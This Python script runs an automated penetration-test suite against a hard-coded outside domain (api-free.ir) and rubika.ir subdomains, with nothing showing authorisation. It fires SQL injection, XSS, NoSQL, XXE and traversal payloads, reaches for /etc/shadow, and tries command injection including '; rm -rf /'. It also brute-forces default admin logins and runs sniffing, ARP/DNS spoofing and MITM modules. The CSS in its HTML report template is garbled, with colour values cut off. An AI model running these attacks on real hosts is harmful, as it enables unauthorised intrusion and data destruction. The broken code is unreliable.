import asyncio
import json
import random
import time
from typing import List, Dict, Any, Optional


from axn.attacks import (
    BruteForce, SQLInjection, XSS, CSRF, DirectoryTraversal, LFI,
    CommandInjection, RemoteFileUpload, SSRF, OpenRedirect, HTTPParameterPollution,
    BlindSQLi, TimeBasedSQLi, UnionSQLi, BooleanSQLi, NoSQLInjection,
    OAuthMisconfiguration, JWTChecker, PasswordResetTester
)


from axn.web import (
    WebScraper, HeaderAnalyzer, FormAnalyzer, LoginTester,
    APIEndpointTester, RateLimitTester, JSONResponseAnalyzer, WAFDetector,
    CORSTester, SubdomainTakeoverDetector, BrokenAuthTester,
    SecurityHeadersChecker, OpenRedirectAdvanced, XXETester, GraphQLAnalyzer
)


from axn.sniffing import PacketSniffer, MITMSimulator


from axn.network import (
    NetworkSimulator, TrafficPatternAnalyzer, PacketInjectionSimulator,
    VPNDetection, ARPSpoofSimulator, DNSSpoofSimulator
)


from axn.utils import (
    PasswordGenerator, RandomUserAgent, CAPTCHASimulator,
    TwoFactorAuthTester, TLSChecker, RateLimiterBypass,
    DOMHijackingDetector, ReferrerPolicyAnalyzer
)


from axn.pentest_tools import (
    PortScanner, SubdomainFinder, APIFuzzer, CookieAnalyzer,
    RateLimitBypassTester, APIKeyExposureChecker
)

from axn.reporting import Report


class TestExecutionError(Exception):
    """Custom exception for test execution failures."""
    pass



domain = "https://api-free.ir"



class PentestConfig:
    def __init__(self):
        self.targets = [domain]  
        self.login_credentials = [
            {"user": "admin", "pass": "password123"},
            {"user": "test", "pass": "testpass"}
        ]
        self.api_endpoints = ["/api/v1", "/users", "/auth"]
        self.urls_to_scan = ["/login", "/register", "/dashboard", "/admin", "/sensitive"]
        self.network_interfaces = ["eth0", "wlan0"] 
        self.test_payloads = {
            "sql_injection": "' OR '1'='1",
            "xss": "<script>alert('XSS')</script>",
            "command_injection": "; ls -la",
            "directory_traversal": "../../../../etc/passwd"
        }
        self.jwt_tokens = ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeIayp-R58a0G6I05y6lC0YkTRK3j7c6n0"]
        self.usernames = ["admin", "user", "root"]
        self.subdomains_to_check = ["dev.rubika.ir", "staging.rubika.ir", "test.example.com"]
        self.ports_to_scan = [22, 80, 443, 8080, 3306]
        self.sensitive_files = ["/etc/passwd", "/etc/shadow", "config.php", ".env"]
        self.graphql_endpoints = ["/graphql"]
        self.xml_payloads = ["<xml><data>&{entity};</data></xml>"] 


class EnhancedReport(Report):
    def __init__(self):
        super().__init__()
        self.results: Dict[str, Dict[str, Any]] = {}
        self.summary = {
            "total_tests": 0,
            "passed": 0,
            "failed": 0,
            "vulnerabilities": 0,
            "information": 0
        }

    async def add_entry(self, category: str, name: str, data: Any, severity: str = "INFO", status: str = "SUCCESS", error: Optional[Exception] = None):
        """
        Adds an entry to the report with more details.
        Severity: INFO, WARNING, CRITICAL
        Status: SUCCESS, FAILED, SKIPPED, PENDING, VULNERABLE
        """
        entry_id = f"{category}::{name}::{int(time.time() * 1000)}"
        self.results[entry_id] = {
            "timestamp": time.time(),
            "category": category,
            "name": name,
            "data": data,
            "severity": severity,
            "status": status,
            "error": str(error) if error else None
        }
        self.summary["total_tests"] += 1
        if status in ["SUCCESS", "VULNERABLE"]:
            if severity == "CRITICAL" or status == "VULNERABLE":
                self.summary["vulnerabilities"] += 1
            else:
                self.summary["information"] += 1
        elif status == "FAILED":
            self.summary["failed"] += 1
        

    async def _process_result(self, result_data: Any):
        """Helper to determine severity and status based on result data."""
        if result_data is None:
            return "INFO", "SUCCESS" 

        result_str = str(result_data).lower()
        if "vulnerable" in result_str or "error" in result_str or (isinstance(result_data, dict) and result_data.get("vulnerable")):
            severity = "CRITICAL"
            status = "VULNERABLE"
        elif "success" in result_str or "found" in result_str or (isinstance(result_data, dict) and result_data.get("status") == "success"):
            severity = "INFO"
            status = "SUCCESS"
        else:
            severity = "INFO" 
            status = "SUCCESS" 
        return severity, status

    async def run_test(self, test_instance: Any, method_name: str, *args, **kwargs):
        """Helper to run a test method and add to report."""
        
        category = "Unknown"
        name = "UnknownTest"
        
        
        if hasattr(test_instance, '__class__') and hasattr(test_instance.__class__, '__module__'):
            module_parts = test_instance.__class__.__module__.split('.')
            if module_parts:
                module_name = module_parts[-1]
                if module_name == 'attacks': category = "Attack"
                elif module_name == 'web': category = "Web"
                elif module_name == 'sniffing': category = "Sniffing"
                elif module_name == 'network': category = "Network"
                elif module_name == 'utils': category = "Utility"
                elif module_name == 'pentest_tools': category = "PentestTool"
                else: category = module_name.capitalize()
        
        
        if hasattr(test_instance, '__class__'):
            name = test_instance.__class__.__name__

        test_identifier = f"{name}.{method_name}"
        result_data = None
        status = "FAILED"
        severity = "WARNING"
        error_obj = None

        try:
            
            method = getattr(test_instance, method_name)
            
            
            if asyncio.iscoroutinefunction(method):
                
                result_data = await method(*args, **kwargs)
            else:
                
                result_data = method(*args, **kwargs)

            
            severity, status = await self._process_result(result_data)

        except Exception as e:
            error_obj = e
            severity = "CRITICAL"
            status = "FAILED"
            result_data = {"error_message": str(e)}

        
        await self.add_entry(category, test_identifier, result_data, severity=severity, status=status, error=error_obj)
        return result_data

    async def show_summary(self):
        print("\n" + "="*30 + " REPORT SUMMARY " + "="*30)
        print(f"Total Tests Executed: {self.summary['total_tests']}")
        print(f"Successful/Informational Tests: {self.summary['information']}")
        print(f"Failed Tests: {self.summary['failed']}")
        print(f"Potential Vulnerabilities Detected: {self.summary['vulnerabilities']}")
        print("="*80)

    async def save(self, filename: str = "pentest_report", format: str = "json"):
        """Saves the report to a file."""
        if format == "json":
            try:
                with open(f"{filename}.json", "w", encoding='utf-8') as f:
                    
                    serializable_results = {}
                    for entry_id, data in self.results.items():
                        serializable_entry = data.copy()
                        
                        try:
                            
                            json.dumps(serializable_entry['data']) 
                        except TypeError:
                            serializable_entry['data'] = f"Non-serializable data of type: {type(serializable_entry.get('data')).__name__}"
                        
                        
                        if serializable_entry.get('error') and not isinstance(serializable_entry['error'], str):
                             serializable_entry['error'] = str(serializable_entry['error'])
                             
                        serializable_results[entry_id] = serializable_entry
                    
                    json.dump({"results": serializable_results, "summary": self.summary}, f, indent=4, ensure_ascii=False)
                print(f"Report saved to {filename}.json")
            except Exception as e:
                print(f"Error saving report to JSON: {e}")
        
        elif format == "html":
            
            html_content = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Pentest Report</title>
                <meta charset="UTF-8">
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 20px; background-color: 
                    h1, h2, h3 { color: 
                    h1 { border-bottom: 2px solid 
                    .report-section { 
                        border: 1px solid 
                        margin-bottom: 15px; 
                        padding: 15px; 
                        border-radius: 8px; 
                        background-color: 
                        box-shadow: 0 2px 5px rgba(0,0,0,.1);
                    }
                    .severity-INFO { border-left: 5px solid 
                    .severity-WARNING { border-left: 5px solid 
                    .severity-CRITICAL { border-left: 5px solid 
                    .status-SUCCESS { color: 
                    .status-VULNERABLE { color: 
                    .status-FAILED { color: 
                    pre { 
                        background-color: 
                        padding: 10px; 
                        border-radius: 4px; 
                        overflow-x: auto; 
                        font-size: 0.9em;
                        white-space: pre-wrap; /* Wrap long lines */
                        word-wrap: break-word;
                    }
                    .summary-list { list-style: none; padding-left: 0; }
                    .summary-list li { margin-bottom: 8px; }
                    .summary-list b { color: 
                    .details-header { display: flex; justify-content: space-between; align-items: center; }
                    .details-header h3 { margin: 0; }
                </style>
            </head>
            <body>
            <h1>Pentest Report</h1>
            """
            html_content += "<h2>Summary</h2>"
            html_content += "<div class='report-section'>"
            html_content += "<ul class='summary-list'>"
            html_content += f"<li><b>Total Tests Executed:</b> {self.summary['total_tests']}</li>"
            html_content += f"<li><b>Successful/Informational Tests:</b> {self.summary['information']}</li>"
            html_content += f"<li><b>Failed Tests:</b> {self.summary['failed']}</li>"
            html_content += f"<li><b>Potential Vulnerabilities Detected:</b> {self.summary['vulnerabilities']}</li>"
            html_content += "</ul>"
            html_content += "</div>"

            html_content += "<h2>Detailed Results</h2>"
            for entry_id, data in self.results.items():
                html_content += f"<div class='report-section severity-{data['severity']}'>"
                html_content += "<div class='details-header'>"
                html_content += f"<h3>{data['category']} - {data['name']}</h3>"
                html_content += f"<p><b>Status:</b> <span class='status-{data['status']}'>{data['status']}</span> | <b>Severity:</b> {data['severity']}</p>"
                html_content += "</div>"
                if data['error']:
                    html_content += f"<p style='color:"
                
                
                display_data = data.get('data', 'No data provided')
                if not isinstance(display_data, (str, int, float, bool, dict, list, type(None))):
                    display_data = f"Non-displayable data of type: {type(display_data).__name__}"
                
                try:
                    pre_content = json.dumps(display_data, indent=2, ensure_ascii=False)
                except TypeError:
                    pre_content = f"Could not serialize data: {type(display_data).__name__}"

                html_content += "<pre>" + pre_content + "</pre>"
                html_content += "</div>"
            html_content += """
            </body>
            </html>
            """
            with open(f"{filename}.html", "w", encoding='utf-8') as f:
                f.write(html_content)
            print(f"Report saved to {filename}.html")
        else:
            print(f"Unsupported format: {format}")



class NetworkTester:
    def __init__(self, report: EnhancedReport, config: PentestConfig):
        self.report = report
        self.config = config

    async def run_all(self):
        print("\n--- Running Network Tests ---")
        
        
        try:
            net_simulator = NetworkSimulator()
            for target_url in self.config.targets:
                
                server_name = f"MockServer_{target_url.split('//')[-1]}"
                server_info = await net_simulator.add_server(server_name, "HTTP")
                await self.report.add_entry("NetworkSimulator", "AddServer", {"target": target_url, "server_info": server_info}, severity="INFO")
        except Exception as e:
            await self.report.add_entry("NetworkSimulator", "Init", {"message": "Failed to initialize NetworkSimulator"}, severity="WARNING", status="FAILED", error=e)


        
        traffic_data = [{"src":"10.0.0.1","dst":"10.0.0.2", "port": 80}]
        await self.report.run_test(TrafficPatternAnalyzer(), "analyze", traffic_data)

        
        for ip in ["192.168.1.1", "10.1.1.1"]:
            await self.report.run_test(VPNDetection(), "detect", ip)

        
        for ip in ["192.168.1.10", "192.168.1.20"]:
            await self.report.run_test(ARPSpoofSimulator(), "run", ip)
            await self.report.run_test(DNSSpoofSimulator(), "run", "mock.domain.com")

        
        packet_data = {"data": "Hello, network!", "dest_ip": "192.168.1.100"}
        await self.report.run_test(PacketInjectionSimulator(), "inject", packet_data)

class PenetrationTester:
    def __init__(self, report: EnhancedReport, config: PentestConfig):
        self.report = report
        self.config = config

    async def run_all(self):
        print("\n--- Running Penetration Tests ---")

        
        for username in self.config.usernames:
            
            passwords = [await PasswordGenerator.generate(8) for _ in range(5)]
            await self.report.run_test(BruteForce(), "run", username, passwords)

        
        for url in self.config.targets:
            await self.report.run_test(SQLInjection(), "run", f"{url}/login?user=admin&pass=' OR '1'='1")
            await self.report.run_test(BlindSQLi(), "run", f"{url}/login?user=admin&pass=' UNION SELECT @@version")
            await self.report.run_test(TimeBasedSQLi(), "run", f"{url}/products?id=1 AND SLEEP(5)")
            await self.report.run_test(BooleanSQLi(), "run", f"{url}/products?id=1 AND 1=1")
            await self.report.run_test(UnionSQLi(), "run", f"{url}/products?id=1 UNION SELECT 1,2,3")

        
        for url in self.config.targets:
            await self.report.run_test(XSS(), "run", f"{url}/search?q={self.config.test_payloads['xss']}")

        
        for path in ["/var/www/html", "/opt/app"]:
            await self.report.run_test(DirectoryTraversal(), "scan", path)
            await self.report.run_test(LFI(), "scan", f"{self.config.targets[0]}/page?file={path}/../../../../etc/passwd")

        
        for cmd in [self.config.test_payloads['command_injection'], "; rm -rf /"]:
            await self.report.run_test(CommandInjection(), "run", cmd)

        
        await self.report.run_test(RemoteFileUpload(), "test", f"{self.config.targets[0]}/upload")

        
        await self.report.run_test(SSRF(), "test", "http://internal.service.local")

        
        await self.report.run_test(OpenRedirect(), "test", f"{self.config.targets[0]}/redirect?url=https://evil.com")
        await self.report.run_test(OpenRedirectAdvanced(), "test", f"{self.config.targets[0]}/redirect?url=https://evil.com")

        
        await self.report.run_test(HTTPParameterPollution(), "test", f"{self.config.targets[0]}/products?id=1&id=2")

        
        await self.report.run_test(NoSQLInjection(), "test", f"{self.config.targets[0]}/login?user={{'$ne':null}}")

        
        await self.report.run_test(OAuthMisconfiguration(), "test", f"{self.config.targets[0]}/oauth/authorize")
        for token in self.config.jwt_tokens:
            await self.report.run_test(JWTChecker(), "test", token)

        
        await self.report.run_test(PasswordResetTester(), "test", f"{self.config.targets[0]}/reset_password")

        
        for payload in self.config.xml_payloads:
             await self.report.run_test(XXETester(), "test", payload.format(entity="xxe"))


class WebTester:
    def __init__(self, report: EnhancedReport, config: PentestConfig):
        self.report = report
        self.config = config

    async def run_all(self):
        print("\n--- Running Web Application Tests ---")

        
        for target in self.config.targets:
            scraper = WebScraper()
            await self.report.run_test(scraper, "fetch", target) 
            await self.report.run_test(HeaderAnalyzer(), "analyze", target)
            await self.report.run_test(FormAnalyzer(), "analyze", f"{target}/form")
            await self.report.run_test(SecurityHeadersChecker(), "check", target)
            await self.report.run_test(WAFDetector(), "detect", target)
            await self.report.run_test(CORSTester(), "test", target)
            await self.report.run_test(SubdomainTakeoverDetector(), "detect", f"sub.{target.split('//')[-1]}")
            await self.report.run_test(ReferrerPolicyAnalyzer(), "check", {"Referrer-Policy": "strict-origin-when-cross-origin"})

        
        for target in self.config.targets:
            
            await self.report.run_test(LoginTester(), "test", f"{target}/login", self.config.login_credentials[0])
            
            await self.report.run_test(BrokenAuthTester(), "test", f"{target}/dashboard")

        
        for api_endpoint in self.config.api_endpoints:
            full_url = f"{self.config.targets[0]}{api_endpoint}"
            await self.report.run_test(APIEndpointTester(), "test", full_url)
            await self.report.run_test(RateLimitTester(), "test", full_url)
            await self.report.run_test(JSONResponseAnalyzer(), "analyze", f"{full_url}/data")
            await self.report.run_test(APIFuzzer(), "fuzz", full_url)
            await self.report.run_test(CookieAnalyzer(), "analyze", full_url)
            await self.report.run_test(RateLimitBypassTester(), "test", full_url)
            await self.report.run_test(APIKeyExposureChecker(), "check", full_url)

        
        for gql_endpoint in self.config.graphql_endpoints:
            await self.report.run_test(GraphQLAnalyzer(), "analyze", f"{self.config.targets[0]}{gql_endpoint}")

        
        await self.report.run_test(DOMHijackingDetector(), "analyze", "<img src='invalid' onerror='alert(1)'>")
        await self.report.run_test(CAPTCHASimulator(), "test", f"{self.config.targets[0]}/captcha")
        await self.report.run_test(TwoFactorAuthTester(), "test", f"{self.config.targets[0]}/2fa")
        await self.report.run_test(TLSChecker(), "check", self.config.targets[0])
        await self.report.run_test(RateLimiterBypass(), "test", f"{self.config.targets[0]}/api")


class SniffingTester:
    def __init__(self, report: EnhancedReport, config: PentestConfig):
        self.report = report
        self.config = config

    async def run_all(self):
        print("\n--- Running Sniffing Tests ---")
        for interface in self.config.network_interfaces:
            try:
                sniffer = PacketSniffer()
                
                
                
                
                
                
                
                
                packets = await sniffer.start(interface, count=5) 
                
                
                serializable_packets = []
                if isinstance(packets, list):
                    for pkt in packets:
                        if hasattr(pkt, 'to_dict'): 
                           serializable_packets.append(pkt.to_dict())
                        else:
                           serializable_packets.append(str(pkt)) 
                else:
                    serializable_packets = packets 

                await self.report.add_entry("PacketSniffer", interface, serializable_packets, severity="INFO", status="SUCCESS")
            except Exception as e:
                await self.report.add_entry("PacketSniffer", interface, {"message": "Could not start sniffer"}, severity="WARNING", status="FAILED", error=e)

        
        for ip in ["192.168.1.10", "192.168.1.20"]:
            await self.report.run_test(MITMSimulator(), "simulate", ip)


class UtilityTester:
    def __init__(self, report: EnhancedReport, config: PentestConfig):
        self.report = report
        self.config = config

    async def run_all(self):
        print("\n--- Running Utility Tests ---")

        
        
        passwords = [await PasswordGenerator.generate(12) for _ in range(5)]
        await self.report.add_entry("PasswordGenerator", "Generated", passwords, severity="INFO")

        
        
        user_agent = await RandomUserAgent().generate()
        await self.report.add_entry("RandomUserAgent", "Generated", user_agent, severity="INFO")

        
        
        ips_to_scan = ["127.0.0.1"]
        for target_url in self.config.targets:
            try:
                
                ip_address = target_url.split('//')[-1].split('/')[0]
                
                if ':' in ip_address:
                    ip_address = ip_address.split(':')[0]
                ips_to_scan.append(ip_address)
            except Exception:
                pass 

        for scan_target in set(ips_to_scan): 
            await self.report.run_test(PortScanner(), "scan", scan_target, ports=self.config.ports_to_scan)

        
        for domain in self.config.targets:
            await self.report.run_test(SubdomainFinder(), "find", domain.split('//')[-1])



class AdvancedPentestSuite:
    def __init__(self):
        self.config = PentestConfig()
        self.report = EnhancedReport()
        self.testers = {
            "network": NetworkTester(self.report, self.config),
            "penetration": PenetrationTester(self.report, self.config),
            "web": WebTester(self.report, self.config),
            "sniffing": SniffingTester(self.report, self.config),
            "utility": UtilityTester(self.report, self.config)
        }

    async def run_all_tests(self):
        print("Starting Advanced Pentest Suite...")
        
        await asyncio.gather(
            *[tester.run_all() for tester in self.testers.values()]
        )
        print("\nAll tests completed.")

    async def generate_report(self):
        await self.report.show_summary()
        await self.report.save(format="json")
        await self.report.save(format="html")

async def main():
    suite = AdvancedPentestSuite()
    await suite.run_all_tests()
    await suite.generate_report()

if __name__ == "__main__":
    
    
    
    
    

    start_time = time.time()
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"\nAn unhandled error occurred during execution: {e}")
    finally:
        end_time = time.time()
        print(f"\nPentest suite execution finished in {end_time - start_time:.2f} seconds.")
